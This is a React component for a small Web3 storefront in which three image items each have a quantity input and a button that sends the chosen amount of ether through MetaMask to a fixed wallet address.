import React from "react";
import { useState } from "react";
import "./App.css";
import Web3 from "web3";

export default function App() {
  const [num, setNum] = useState(1);
  const [num1, setNum1] = useState(1);
  const [num2, setNum2] = useState(1);
  const [errorMessage, setErrorMessage] = useState("");
  const [errorMessage1, setErrorMessage1] = useState("");
  const [errorMessage2, setErrorMessage2] = useState("");

  const handleClick = async () => {
    // Check if Metamask is installed
    if (typeof window.ethereum === "undefined") {
      setErrorMessage("Please install Metamask");
      return;
    }
    // Request user's wallet access
    const accounts = await window.ethereum.request({
      method: "eth_requestAccounts",
    });

    // Send payment using user's wallet address and selected amount
    const web3 = new Web3(window.ethereum);
    web3.eth
      .sendTransaction({
        from: accounts[0],
        to: "0x42476679D3999e498b1D3E7225BBA3b8e9c019D2", // Recipient wallet address
        value: web3.utils.toWei(`${num}`, "ether"),
      })
      .then(() => setErrorMessage("Transaction successful"))
      .catch(() => setErrorMessage("Transaction failed"));
  };

  const handleClick1 = async () => {
    // Check if Metamask is installed
    if (typeof window.ethereum === "undefined") {
      setErrorMessage1("Please install Metamask");
      return;
    }
    // Request user's wallet access
    const accounts = await window.ethereum.request({
      method: "eth_requestAccounts",
    });

    // Send payment using user's wallet address and selected amount
    const web3 = new Web3(window.ethereum);
    web3.eth
      .sendTransaction({
        from: accounts[0],
        to: "0x42476679D3999e498b1D3E7225BBA3b8e9c019D2", // Recipient wallet address
        value: web3.utils.toWei(`${num1}`, "ether"),
      })
      .then(() => setErrorMessage1("Transaction successful"))
      .catch(() => setErrorMessage1("Transaction failed"));
  };

  const handleClick2 = async () => {
    // Check if Metamask is installed
    if (typeof window.ethereum === "undefined") {
      setErrorMessage2("Please install Metamask");
      return;
    }
    // Request user's wallet access
    const accounts = await window.ethereum.request({
      method: "eth_requestAccounts",
    });

    // Send payment using user's wallet address and selected amount
    const web3 = new Web3(window.ethereum);
    web3.eth
      .sendTransaction({
        from: accounts[0],
        to: "0x42476679D3999e498b1D3E7225BBA3b8e9c019D2", // Recipient wallet address
        value: web3.utils.toWei(`${num2}`, "ether"),
      })
      .then(() => setErrorMessage2("Transaction successful"))
      .catch(() => setErrorMessage2("Transaction failed"));
  };

  const web3 = new Web3(Web3.givenProvider || "http://localhost:8545");

  return (
    <div className="header">
      <div className="item1">
        <br />
        <img
          src="https://i.seadn.io/gae/3wmHntqiSg6KOpfniQjmLHRRzuX6yqn6gzYCoQDgoJi7oAPb5e7gpuszH8jmuIL1LXEq9dpUOsGRxSrPjEMf9BXAokNjyIcpWpml?auto=format&w=384"
          alt="Descrição da imagem"
        />
        <br />
        <br />
        <input
          type="number"
          min={1}
          max={10}
          value={num}
          onChange={(e) => setNum(e.target.value)}
        />
        <br />
        <br />

        <button onClick={handleClick}>Purchase ID 1</button>
        <br />
        {errorMessage && <p style={{ color: "red" }}>{errorMessage}</p>}
        <br />
      </div>
      <br />

      <div className="item2">
        <img
          src="https://i.seadn.io/gae/cg_pO2RXfu21FowfToYRgiSq-mnjIUAU8j9ACWTBrds5Yfk2W6oCvHDxZoZl4p9_hwtkCBCxKsy5-mWVnG-rwO4K18SjA05Obn-kxw?auto=format&w=384"
          alt="Descrição da imagem"
        />
        <br />
        <br />
        <input
          type="number"
          min={1}
          max={10}
          value={num1}
          onChange={(e) => setNum1(e.target.value)}
        />
        <br />
        <br />

        <button onClick={handleClick1}>Purchase ID 2</button>
        <br />
        {errorMessage1 && <p style={{ color: "red" }}>{errorMessage1}</p>}
        <br />
      </div>
      <br />
      <div className="item3">
        <img
          src="https://i.seadn.io/gae/vVBsMoqul6ywAgKO-RV6CuaZTmhljboOquflPhc2WYzRomKq2IZAegjmEXOCux6kG7bnhxt7-CpV2hvjOcsfQDecmtDfi3sG_YY2?auto=format&w=384"
          alt="Descrição da imagem"
        />
        <br />
        <br />
        <input
          type="number"
          min={1}
          max={10}
          value={num2}
          onChange={(e) => setNum2(e.target.value)}
        />
        <br />
        <br />

        <button onClick={handleClick2}>Purchase ID 3</button>
        <br />
        {errorMessage2 && <p style={{ color: "red" }}>{errorMessage2}</p>}
        <br />
      </div>
    </div>
  );
}
